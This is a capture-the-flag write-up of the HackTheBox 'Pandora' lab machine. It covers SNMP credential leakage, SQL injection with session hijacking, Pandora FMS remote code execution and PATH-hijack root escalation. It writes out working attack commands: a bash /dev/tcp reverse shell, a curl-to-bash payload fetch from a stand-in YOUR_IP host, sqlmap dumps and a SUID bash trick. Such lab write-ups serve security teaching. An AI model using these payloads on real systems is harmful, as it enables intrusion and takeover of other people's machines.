# HackTheBox — Pandora Writeup

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.x.x  

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [SNMP Enumeration](#2-snmp-enumeration)
3. [Initial Foothold — SSH as Daniel](#3-initial-foothold--ssh-as-daniel)
4. [Internal Enumeration & Port Forwarding](#4-internal-enumeration--port-forwarding)
5. [SQL Injection — Session Hijack as Matt](#5-sql-injection--session-hijack-as-matt)
6. [Remote Code Execution — Shell as Matt](#6-remote-code-execution--shell-as-matt)
7. [Privilege Escalation — PATH Hijacking to Root](#7-privilege-escalation--path-hijacking-to-root)

---

## 1. Reconnaissance

### TCP Scan

```bash
nmap -sV -sC -v 10.129.x.x
```

**Results:**
- Port 22 — OpenSSH
- Port 80 — Apache HTTP Server

### UDP Scan

```bash
nmap -sU 10.129.x.x
```

**Results:**
- Port 161 — SNMP (Simple Network Management Protocol)

> **Key Takeaway:** Always scan UDP ports. SNMP on port 161 is frequently overlooked and often leaks sensitive information.

---

## 2. SNMP Enumeration

SNMP exposes management data about a device including running processes, open ports, installed software, and critically — **process command line arguments in plaintext**.

```bash
snmpwalk -v2c -c public 10.129.x.x 
```

For faster enumeration, use snmpbulkwalk and grep for interesting strings:

```bash
snmpbulkwalk -Cr1000 -c public -v2c 10.129.x.x | grep "daniel"
```

**Critical finding in the process table:**

```
iso.3.6.1.2.1.25.4.2.1.5.943 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
```

A service was passing credentials as CLI arguments which SNMP exposed in plaintext.

**Credentials found:**
```
Username: daniel
Password: HotelBabylon23
```

**SNMP also revealed internal open ports:**

```
127.0.0.1:80   (internal web server)
127.0.0.1:3306 (MySQL — local only)
```

---

## 3. Initial Foothold — SSH as Daniel

```bash
ssh daniel@10.129.203.37
# Password: HotelBabylon23
```

Once inside, we can see another user exists:

```bash
ls /home
# daniel  matt
```

The user flag is in `/home/matt/user.txt` but daniel cannot read it. We need to move laterally to matt.

---

## 4. Internal Enumeration & Port Forwarding

### Finding Pandora FMS

Enumerate the web directories:

```bash
ls -al /var/www/
# html     (public static site)
# pandora  (Pandora FMS — internal only)
```

Read the Apache virtual host configuration:

```bash
cat /etc/apache2/sites-enabled/pandora.conf
```

Key finding — Pandora FMS is bound to `127.0.0.1:80` meaning it is only accessible from inside the machine itself. It cannot be reached from the outside.

### Setting Up SSH Port Forwarding

To access the internal web app from our browser, we use SSH local port forwarding:

```bash
ssh -L 9090:127.0.0.1:80 daniel@10.129.x.x
```

**What this does:**
- Opens port 9090 on our local machine
- Any traffic to our `localhost:9090` gets tunneled through SSH
- SSH delivers it to `127.0.0.1:80` on the remote machine
- The remote machine thinks the request is coming from itself

```
Your Machine                     Remote Machine
                                 
Browser → localhost:9090         Pandora FMS
              |                       ^
              |====[ SSH tunnel ]======|
```

Now visit `http://localhost:9090/pandora_console` in your browser to see the Pandora FMS login page.

**Version identified at bottom of login page:** `v7.0NG.742_FIX_PERL2020`

---

## 5. SQL Injection — Session Hijack as Matt

### CVE-2021-32099 — Unauthenticated SQL Injection

Pandora FMS v7.0NG.742 is vulnerable to SQL injection in the `chart_generator.php` endpoint. The `session_id` parameter is passed directly into a SQL query without sanitization.

The vulnerable endpoint is accessible without authentication:

```
/pandora_console/include/chart_generator.php?session_id=''
```

### Exploiting with sqlmap

```bash
sqlmap --url="http://localhost:9090/pandora_console/include/chart_generator.php?session_id=''" \
       -T tsessions_php --dump
```

sqlmap identifies multiple injection types (boolean-based blind, error-based, time-based blind) and dumps the sessions table.

**Matt's session found in output:**

```
g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";
```

### Hijacking Matt's Session

In the browser, navigate to `http://localhost:9090/pandora_console` and open the developer console (F12):

```javascript
document.cookie = "PHPSESSID=g4e01qdgk36mfdh90hvcc54umq"
```

Refresh the page. You are now logged into Pandora FMS as user **matt**.

> **How session hijacking works:** PHP websites identify users via a session cookie (PHPSESSID). By setting our cookie to matt's stolen session ID, the server thinks all our requests are coming from matt. No password needed.

---

## 6. Remote Code Execution — Shell as Matt

### CVE-2020-13851 — Authenticated RCE

The Events functionality in Pandora FMS passes user input directly to a system command without sanitization.

### Setup

On your local machine, create the reverse shell payload:

```bash
echo 'bash -i >& /dev/tcp/YOUR_IP/4445 0>&1' > shell.sh
```

Start a web server to host it:

```bash
python3 -m http.server 8888
```

Start a netcat listener:

```bash
nc -lvnp 4445
```

### Triggering RCE

Send the following curl request (replace YOUR_IP with your tun0 IP):

```bash
curl -s -b "PHPSESSID=g4e01qdgk36mfdh90hvcc54umq" \
"http://localhost:9090/pandora_console/ajax.php" \
--data "page=include/ajax/events&perform_event_response=10000000&target=curl+YOUR_IP:8888/shell.sh|bash&response_id=1"
```

A reverse shell connects back on your netcat listener as **matt**.

### Stabilize the Shell

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
# Enter 'xterm' when prompted for terminal type
export TERM=xterm
```

**Grab user flag:**

```bash
cat /home/matt/user.txt
```

---

## 7. Privilege Escalation — PATH Hijacking to Root

### Finding the Vulnerable SUID Binary

```bash
find / -perm -4000 2>/dev/null
```

**Unusual entry found:**

```
/usr/bin/pandora_backup
```

This binary is owned by root and has the SUID bit set — meaning it runs as root regardless of who executes it.

### Analysing the Binary

```bash
strings /usr/bin/pandora_backup
```

Key finding in the output:

```
tar -cvf /root/pandora-backup.tar.gz /var/www/pandora
```

The binary calls `tar` using a **relative path** instead of the full path `/usr/bin/tar`.

### Understanding PATH Hijacking

When Linux runs a command without a full path, it searches through the directories listed in the `$PATH` variable in order and runs the first match it finds.

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**The attack:** Create a malicious file named `tar` in `/tmp`, then put `/tmp` at the beginning of PATH. When `pandora_backup` (running as root via SUID) calls `tar`, it finds our malicious file first and executes it as root.

### Executing the Attack

**Step 1 — Create malicious tar that copies bash with SUID:**

```bash
echo 'cp /bin/bash /tmp/bash && chmod 4777 /tmp/bash' > /tmp/tar
chmod +x /tmp/tar
```

**Step 2 — Put /tmp first in PATH:**

```bash
export PATH=/tmp:$PATH
```

**Step 3 — Run the SUID binary:**

```bash
/usr/bin/pandora_backup
```

pandora_backup runs as root, finds our `/tmp/tar` first, executes it as root, which creates `/tmp/bash` with SUID set.

**Step 4 — Execute the SUID bash:**

```bash
/tmp/bash -p
```

The `-p` flag preserves the elevated EUID. Without it bash drops root privileges as a security measure.

**Verify root:**

```bash
id
# uid=1000(matt) gid=1000(matt) euid=0(root)
```

`euid=0` means effective user is root — full root privileges regardless of the real UID still showing matt.

**Grab root flag:**

```bash
cat /root/root.txt
```

---

## Attack Chain Summary

```
SNMP enum (UDP 161)
    → Cleartext credentials for daniel in process args
        → SSH as daniel
            → Apache vhost config reveals Pandora FMS on 127.0.0.1:80
                → SSH port forwarding to access internal app
                    → SQLi (CVE-2021-32099) dumps session table
                        → Session hijack → logged in as matt in Pandora FMS
                            → RCE (CVE-2020-13851) → reverse shell as matt
                                → SUID pandora_backup + PATH hijacking
                                    → Root
```
